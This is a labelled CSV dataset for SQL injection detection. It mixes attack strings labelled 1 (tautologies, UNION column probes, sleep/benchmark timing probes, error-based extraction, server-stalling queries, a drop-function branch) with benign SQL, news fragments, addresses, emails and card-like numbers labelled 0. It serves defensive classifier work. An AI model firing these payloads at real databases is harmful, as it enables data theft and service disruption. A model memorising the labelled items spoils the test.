Sentence,Label
select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1,1
16707,0
83475055m,0
select   (  case when   (  2593  =  3592  )   then 2593 else 2593*  (  select 2593 from information_schema.character_sets  )   end  )  #,1
"1"" where 6501 = 6501",1
SELECT * FROM found WHERE ride BETWEEN '1996-07-01' AND '1996-07-31',0
"1%""  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1
kussauer_brereton@showcarsmadrid.com.kp,0
"-2197' union all select 8065,8065,8065,8065--",1
venfica,0
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'sqni' like 'sqni",1
1534180000000000,0
"-6360' )  as yfrk where 3683 = 3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",1
"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""%""  =  """,1
"1""   )    )    union all select null--",1
4 percent $ 37,0
"motril, 131",0
SELECT * FROM numeral FETCH FIRST 3 ROWS ONLY,0
" select * from users where id = 1 or "",;"" or 1 = 1 -- 1",1
espins marmesat,0
rueda canuda,0
"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'pmzp' like 'pmzp",1
78590398l,0
1'+  (  select somn where 8636  =  8636 rlike sleep  (  5   )    )   +',1
"1"" )  as pkkx where 6716 = 6716 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 ) --",1
SELECT * FROM circus WHERE Price NOT BETWEEN 10 AND 20,0
"-6680""   )    )     )   union all select 2564,2564,2564,2564,2564,2564#",1
indagatoria,0
macrina,0
delf,0
-1300  )   as rrsm where 1086  =  1086 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
" Man star; soul Render honest perfect man, Commands light, influence, fate; Nothing falls early late",0
 We &apos;ve got remember ,0
todito,0
SELECT COUNT ( table )  FROM win,0
dumeniaud@lamejorplaya.tn,0
" It &apos;s second job , said , funds 60% nonprofit; rest covered private donations ",0
colodner@proofreader.sj,0
bose,0
SELECT * FROM breathing WHERE dropped NOT LIKE 'bottom%',0
SELECT COUNT ( grew )  FROM noise,0
"1 where 4319 = 4319 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
pedro de la gasca 140,0
+fisgn,0
c/ maria de padilla 5 12a,0
9140660684303193,0
olsen,0
14399392n,0
338196000000000,0
"c/ fontanelles, 196,",0
"isabel la catolica, 5",0
SELECT AVG ( for ) FROM verb SELECT SUM ( drink ) ,0
campo de san pedro,0
pasadizo fernandez 92 3-c,0
77452423s,0
DELETE FROM bank,0
99ortadero,0
c/ doctor coll s/n 8g,0
select case when 1892 = 3646 then 1 else null end--,1
muehle,0
"1%"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""%""  =  """,1
-6190'  )   where 2621  =  2621 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
"calle monte miramar, s/n",0
"calle mayor, s/n 11h",0
tagamanent,0
"  SELECT out AS fence, good AS [quietly]  FROM who",0
"1"" )  where 4660 = 4660 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
heile,0
drissel,0
SELECT tribe ( s )  FROM necessary UNION,0
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,1
"1' in boolean mode )  union all select null,null,null,null,null#",1
bogs terradas,0
byoung,0
1366,0
" select * from users where id = 1 or 1#"". union select 'a',version (  )  -- 1",1
inglis@baltasarsantos.vu,0
41724359j,0
derbarn henriquez,0
"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  # ujdg",1
"carrer mestre albages 61,",0
"calle roma, 189, 12h",0
arce/artzi,0
verani@viajesdacapalla.gq,0
"calle virgen de la estrella, 196",0
"1""  )  )   as nsbu where 6569 = 6569 or sleep ( 5 ) #",1
"1""  )   as fgne where 7207  =  7207",1
1'||  (  select 'xqqp' where 3007  =  3007 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
nardi borgua,0
1' where 2913 = 2913 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --,1
-3422%' )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( '%' = ',1
1  )  )   as ogcv where 4396 = 4396,1
"   SELECT suppose, direction, nor FROM game WHERE president  IS NULL",0
or isNULL  (  1/0  )   /*,1
"1%"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,1
" select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",1
"1  )  )   )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (   ( 4127 = 4127",1
"1 and elt  (  4249  =  4249,7259  )  # lwyo",1
"1%' and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
shaughnessy@white-pearl-resort.nf,0
-5286' or 6783  =  1233,1
goertzen,0
scot,0
"1""  )   or sleep  (  5  )   and   (  ""fiag"" like ""fiag",1
-3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420#,1
1918370923327655,0
"1 where 3410 = 3410 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
if  (  6767  =  5022  )   select 6767 else drop function buii--,1
5218,0
bow@whitepearlresort.pl,0
"  SELECT primitiveID AS ID, sign AS respect FROM happy",0
"1'  )   union all select null,null,null#",1
SELECT COUNT ( DISTINCT environment )  FROM metal,0
"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'lwrk' like 'lwrk",1
SELECT COUNT ( DISTINCT breathe )  FROM myself,0
robledillo de la jara,0
calle laguna de pealara 171 12-e,0
-3431%' )  or 9323 = 9323#,1
SELECT * FROM product WHERE water BETWEEN 'case' AND 'mail',0
SELECT * FROM stream,0
"-8923'+ ( select xgvz where 9858 = 9858 union all select 9858,9858,9858#",1
SELECT * FROM finest WHERE upper NOT LIKE '[chief]%',0
"1""  )   as hfgk where 1100  =  1100 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
select   (  case when   (  4769  =  4769  )   then 4769 else 4769*  (  select 4769 from mysql.db  )   end  )  #,1
select  ( case when  ( 1499 = 4923 )  then 1499 else 1/ ( select 0 )  end ) --,1
"1'  )   as mgko where 1828  =  1828 and make_set  (  8403  =  8403,8899  )  --",1
SELECT already FROM heat UNION ALL SELECT hundred FROM again ORDER BY root,0
"1' and elt  (  1210  =  1210,sleep  (  5   )    )   ",1
"calle olmo seco, 126,",0
sarfati@weat.nc,0
1%'  )   and sleep  (  5  )  #,1
almonacid de la sierra,0
dueppen,0
SELECT * FROM golden WHERE conversation = 'whether' LIMIT 3,0
1'  )  )   )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( 'yxpi' = 'yxpi,1
renan1@fichajes.nom.sd,0
" Union SPD continued coalition negotiations , addressing topics internal affairs justice ",0
17256,0
"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",1
discoro,0
SELECT * FROM walk WHERE poetry NOT LIKE '[television]%',0
melcocha,0
SELECT COUNT ( firm ) FROM element,0
3318282529234021,0
-4173' )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 'jdwt' like 'jdwt,1
SELECT * FROM dear WHERE corner = 'street',0
SELECT fresh ( s )  FROM growth SELECT electric ( s ) ,0
coripe,0
-6616  )   order by 1--,1
DELETE FROM step WHERE now = 'other',0
 UPDATE shells SET shop = 'serious'WHERE loss = 'process',0
1'  )   where 8776  =  8776 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
63395358k,0
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
4478740000000000,0
"1"" and sleep  (  5  )  ",1
19392,0
"1%"" or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and ""%"" = """,1
" end and ""mdje"" like ""mdje",1
SELECT * FROM pan,0
4056lan0e,0
1'||  (  select 'mwpd' where 2887  =  2887,1
1'  )  )   as fbjd where 8597 = 8597,1
1  )   where 9078  =  9078 rlike sleep  (  5  )  #,1
97176413x,0
1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   7805  =  7805,1
"-9150%'  )  )   )  union all select 7057,7057,7057,7057,7057,7057,7057,7057--",1
arona,0
char%4039%41%2b%40SELECT,1
"-5763'  )  )   )  union all select 1640,1640,1640,1640,1640,1640,1640,1640,1640,1640#",1
1   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
-9327' )  or 3038 = 3038,1
" Do work, shall reinforce yourself",0
7216629920720191,0
"1""  )   where 7513  =  7513 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
"  SELECT ISNULL ( ""Hello world!"" ) ;",0
porta aylagas,0
normando,0
"plaza pont 47, 6?e",0
5385467629611173,0
"1' )  where 9006 = 9006 union all select null,null,null,null,null,null--",1
"  SELECT TIMESTAMP ( ""2017-07-23"",  ""13:10:11"" ) ;",0
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1
favio_zakin@so-tel.cl,0
49714,0
"  UPDATE tomorrow SET plant =  'or', City =  'nearer' WHERE garden =  pipe",0
5586,0
" US President Barack Obama kept informed situation , said White House spokesperson Jay Carney ",0
uk new2 4 1 * ** *** **** ****** ******* ******** ********* ************* ******************* ********************** subject desc 79 sub0104 9 e_qna eng modify 1 28988 28988 F1 read F1 9636 35 v aWR4PTM0MjQsd1mc3RhcnRQYWdlPTMxNSZsaXN0Tm89MjU5NSZ0YWJsZT1yZWRfYmJzX2RhdGEmY29kZT1xbmEmc2VhcmNoX2l0ZW09JnNlYX123Jja123F9vcmRlcj0 = || Y29kZT1xbmEmc2VhcmNsasdf;lkaspodfkd123oX2l0sdfsdZW09JnNlYXJjaF9vcmRlcj0mdW5zaW5nY29kZTE9MTI1Nzc1NTY5MSZ1bnNpbmdjb2RlMj0xMjU3NzU1N123zczJnVuc2luZ2NvZGUzPSZjYXRlPSZwd2Q9|| e_qna eng 난 짱이다,0
1' where 4945  =  4945,1
"select sleep  (  5  )   and   (  ""innk""  =  ""innk",1
-1985  )  )   )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( 1248 = 1248,1
28670,0
triana,0
caigua llobet,0
"  SELECT Orders.pigrID, Employees.shirt, Employees.already FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.hornID ORDER BY Orders.goldID",0
" A man learn detect watch gleam light flashes across mind within, lustre firmament bards sages",0
"1' )  as kgnd where 1550 = 1550 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
guilas,0
"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
FROM  ( SELECT DISTINCT memory FROM track ) ,0
" Change indeed happened , years since I cast first ballot ",0
3074429999083032,0
"1%"" union all select null,null,null,null,null,null,null,null,null,null#",1
"1'   )    )     )   union all select null,null,null,null,null,null--",1
SELECT * FROM outer  WHERE headed = grain,0
if ( 3245 = 6168 )  select 3245 else drop function nafj--,1
SELECT butter ( s FROM neck RIGHT JOIN,0
SELECT pound ( s )  FROM seen,0
" select * from users where id  =  1 or "";&"" or 1  =  1 -- 1",1
"1   )    )    as fmpr where 3103  =  3103 and elt  (  9970  =  9297,9297  )  --",1
"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1
 Local public transport also become expensive ,0
6608r.lo2uo,0
pilapil@espaciopintor.my,0
1 where 6036  =  6036 and 7533  =  7533--,1
fuente el saz,0
"-2168  )   union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--",1
SELECT TOP 50 PERCENT * FROM distance SELECT * FROM effort FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM measure,0
hasbrouc,0
castellanos gdia,0
1' where 9216 = 9216,1
"1   )    )    as huxq where 7451  =  7451 union all select null,null,null--",1
8355091548756460,0
emad,0
goodman4,0
hervidor,0
SELECT * FROM society WHERE adult NOT LIKE 'voyage%',0
"de la coma, 112 4-b",0
"1"" where 4213  =  4213 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"-9638  )  )   )  or elt ( 1032 = 1032,3623 )  and   (  (   ( 3679 = 3679",1
"1'  )  )   or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
5326624144210576,0
8711764865979361,0
pedemonte@mystyleperfume.th,0
"  SELECT thinkID AS ID, dry AS him FROM finally",0
perseidas,0
villapalacios,0
 Surgery rendered infertile ,0
"1'||  (  select 'asfl' from dual where 5846  =  5846 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
SELECT * FROM immediately WHERE face = 'home'  OR death = 'class',0
"sanchez 49,",0
" Kirchen-Hausen celebrate 1,250th anniversary celebratory weekend 18 20 July ",0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +',1
"INSERT INTO attack ( fierce, manufacturing, tree, settlers, built, magnet )  VALUES  ( 'condition', 'journey'. difficult', 'gather', 'equator', 'shade', 'giant' )  ",0
insanable,0
"SELECT column1 , column2, ... FROM table_name WHERE condition ;",0
" SELECT * FROM blank ORDER BY label, engine",0
-6500'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'padu' like 'padu,1
"-4015"" where 2610  =  2610 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
SELECT MIN ( fighting )  AS send FROM automobile,0
SELECT * FROM captured FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM arrange,0
fedora,0
"-3729'   )    )    or elt  (  4482  =  2648,2648  )   and    (    (   'vkkr' like 'vkkr",1
e906aci9,0
-3083  )   or 5221  =  7829,1
SELECT AVG ( Price ) FROM tried,0
oda,0
end and    (    (     (  'xzbk'  =  'xzbk,1
gemma,0
"1'   )    )    as lxjs where 6503  =  6503 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",1
 Rather rattled U,0
"1%' )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( '%' = '",1
9.42955E+015,0
-3100' )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 'etuj' like 'etuj,1
3064,0
"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",1
SELECT * FROM largest WHERE rhythm = 'breathe',0
"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",1
SELECT * FROM gone WHERE around = 'bear' LIMIT 3,0
"1""  )   as hsws where 6656  =  6656",1
SELECT * FROM popular WHERE grandfather = 'after' FETCH FIRST 3 ROWS ONLY,0
"   SELECT Employees.safe, COUNT ( Orders.keptID )  AS quietFROM    ( OrdersINNER JOIN model ON Orders.landID  =  Employees.babyID ) ",0
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and  ( 'qfsu' = 'qfsu",1
SELECT * FROM personal WHERE sink = 'nation',0
4617331244727589,0
1'||  (  select 'bupa' from dual where 8548  =  8548,1
"baixada carme, 165, 3?e",0
end and 'huti' like 'huti,1
"-8773%'   )    )     )   union all select 8941,8941,8941,8941,8941,8941#",1
"  UPDATE effort SET noise =  'process', City =  'smaller' WHERE strong =  sets",0
orourke7@stockdefotos.lk,0
"1""   )    )    as thoj where 1577  =  1577 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
consumativo,0
"select * from generate_series ( 7724,7724,case when  ( 7724 = 8170 )  then 1 else 0 end )  limit 1--",1
SELECT trail FROM tie,0
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1
0332806980099354,0
SELECT * FROM carry WHERE walk = 'body' LIMIT 3,0
SELECT * FROM farm WHERE grass = 'material' FETCH FIRST 3 ROWS ONLY,0
del ngel kercad,0
SELECT baseball ( s )  FROM consist FULL OUTER JOIN,0
fuentelviejo,0
maello,0
"1' where 2964 = 2964 union all select null,null,null#",1
a79ga44,0
SELECT * FROM bring 3,0
mallorie,0
"torms, els",0
vallado oliveras,0
olas del rey,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367848 )  ORDER BY meta_id ASC",0
SELECT * FROM  ( SELECT attack FROM nearby ) ,0
1'  )   where 9817  =  9817,1
"1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --",1
50368,0
waitfor delay '0:0:5' and 'dfzn' = 'dfzn,1
panell portaneri,0
 end and 'hizd' = 'hizd,1
oblak,0
minardi cardea,0
arcngel,0
 UPDATE silly SET press = 'coach'WHERE manufacturing = 'fourth',0
SELECT * FROM give WHERE ability NOT LIKE '[dropped]%',0
nez,0
" &quot; Finally ! &apos; , raved Mayor Steinar Bergsland inaugural ceremony , televised broadcaster TV2 ",0
" However , pawnbrokers advantage requiring credit checks proof salary , arrange loans faster banks ",0
"1'+ ( select dklk where 9862 = 9862 union all select null,null,null,null,null,null--",1
SELECT * FROM collect,0
terrs triola,0
"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- zvkh",1
"1%""  )  )   )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
" It horses found admired grounds , many animals sheep , goats , cows chickens well ",0
"1'|| ( select 'pvmz' from dual where 1090 = 1090 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1  )  )  ||'",1
"c/ fuente 28,",0
"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",1
"1' where 9961  =  9961 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1"" )  where 9285 = 9285 and 8506 = 8343#",1
SELECT * FROM only,0
"c/ juan garcia abellan, 25 6?e",0
"-6798%""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,1
 The recourse slash wages public spending - spurred Berlin ,0
"calle el pilar s/n,",0
74566884x,0
"1  )  )   and elt ( 4249 = 4249,7259 )  and   (  (  5683 = 5683",1
7o30s5si7,0
2626,0
04858,0
"-3349' or elt  (  6610  =  4379,4379  )   and 'poqm' like 'poqm",1
lavada,0
SELECT * FROM summer WHERE jungle IN  ( SELECT push FROM fence ) ,0
select pg_sleep  (  5  )   and '%'  =  ',1
51804577k,0
mcgowan,0
" SELECT * FROM own ORDER BY busy, direct",0
namkoong@quadernideilgarda.no,0
"c/ la magdalena 187,",0
SELECT * FROM wp_posts WHERE ID  =  239189 LIMIT 1,0
hembrick,0
" As result , revolt brewing , especially France , EU &apos;s main cheerleader ",0
"-7808""   )    )    as jgkk where 9230  =  9230 or elt  (  1032  =  1032,3623  )  --",1
"1""  )  )   waitfor delay '0:0:5' and   (  (  ""koni"" like ""koni",1
admin' or '1'  =  '1'#,1
d68as4o,0
SELECT Count ( * )  AS mine,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'nslo' like 'nslo",1
SELECT * FROM row ORDER BY change DESC,0
SELECT * FROM volume WHERE child IN  ( SELECT ought FROM third ) ,0
" When grown , make decisions bodies ",0
08739,0
" In 1970s , city fathers wanted car-friendly city , therefore sections old city wall remain tall ",0
oliver,0
00nd11e0,0
irre2u3er6b22,0
25138,0
redolat cardiel,0
"   SELECT 'Customer' AS Type, ContactName, City, CountryFROM Customers  UNIONSELECT 'Supplier', ContactName, City, Country",0
10303147k,0
"1 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) ",1
pampa,0
" select * from users where id  =  1 or   (  \+  )    =  1 union select 1,@@VERSION -- 1",1
SELECT COUNT ( softID ) FROM top,0
1' where 9416 = 9416,1
SELECT AVG ( load ) FROM arrange,0
select   (  case when   (  3325  =  1767  )   then 3325 else 3325*  (  select 3325 from mysql.db  )   end  )  #,1
" &quot; Some people life-endangering conditions require surgery , kids , &quot; said ",0
krug,0
76591879q,0
SELECT TOP 50 PERCENT * FROM brother,0
mercado 188,0
castrillo matajudos,0
9366,0
16966742x,0
72367579b,0
1350450000000000,0
"1""  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (   ( ""uncg"" = ""uncg",1
"-8178 )  union all select 4163,4163,4163,4163,4163,4163,4163--",1
‘ or 3  =  3 --,1
9955615288852463,0
flo hosta,0
"iif ( 2840 = 3788,1,1/0 ) ",1
SELECT * FROM gone WHERE automobile = 'smaller' LIMIT 3,0
.32l6152v0o,0
evandro,0
26526,0
bolly,0
" SELECT * FROM well ORDER BY pile ASC, child DESC",0
rosa,0
SELECT chemical ( s )  FROM offer UNION,0
1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'ltki'  =  'ltki,1
1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo,1
asperillo,0
"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1
-5751 )  as jybu where 4739 = 4739 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --,1
"avinguda joan xxiii 0,",0
"1%' )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  ( '%' = '",1
"-1084' )  union all select 2634,2634,2634,2634,2634,2634,2634,2634#",1
co8mov8mi886o,0
SELECT * FROM exactly,0
opsito,0
ab6ga*d45co,0
1' in boolean mode  )   union all select null--,1
SELECT last ( s )  FROM bank UNION ALL,0
64446970g,0
"  SELECT numeralID AS ID, nest AS alike FROM remarkable",0
-2452'  )  )   )  union all select 1951--,1
"-8698"" where 1990  =  1990 or   (  8459  =  8459  )  *4906--",1
4.46658E+015,0
"1""  )  )   as qejm where 9014 = 9014 union all select null,null,null,null,null,null#",1
 They read time streams ,0
"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1""  )  )   )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( ""urgd"" = ""urgd",1
"  UPDATE plant SET form =  'blanket', City =  'pound' WHERE hand =  flat",0
